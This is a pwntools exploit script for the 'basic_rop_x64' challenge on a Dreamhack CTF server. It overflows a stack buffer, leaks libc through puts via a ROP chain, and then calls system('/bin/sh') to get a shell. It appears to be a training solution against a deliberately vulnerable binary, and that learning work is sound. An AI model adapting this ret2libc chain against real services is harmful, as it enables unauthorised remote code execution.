# Name: basic_rop_x64.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

def slog(name, addr):
    success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 10770

# conn = process('./basic_rop_x64') # local
conn = remote(HOST, PORT)
e = ELF('./basic_rop_x64')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
gadget = {
    'ret' : 0x4005a9,
    'pop rdi; ret' : 0x400883
}

buf = b'A' * 0x40
SFP = b'B' * 0x8
payload = buf + SFP

# puts(puts_got)
payload += p64(gadget['ret']) # alignment for movaps instruction
payload += p64(gadget['pop rdi; ret']) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(e.sym['main']) # return to main

conn.send(payload)

conn.recvuntil(b'A' * 0x40)
puts = u64(conn.recvn(6) + b'\x00\x00')
lb = puts - libc.sym['puts']
system = lb + libc.sym['system']
sh = lb + list(libc.search(b'/bin/sh'))[0]

slog('puts', puts)
slog('libc_base', lb)
slog('system', system)
slog('/bin/sh', sh)

# system("/bin/sh")
payload = buf + SFP
payload += p64(gadget['pop rdi; ret']) + p64(sh)
payload += p64(system)

conn.send(payload)
conn.interactive()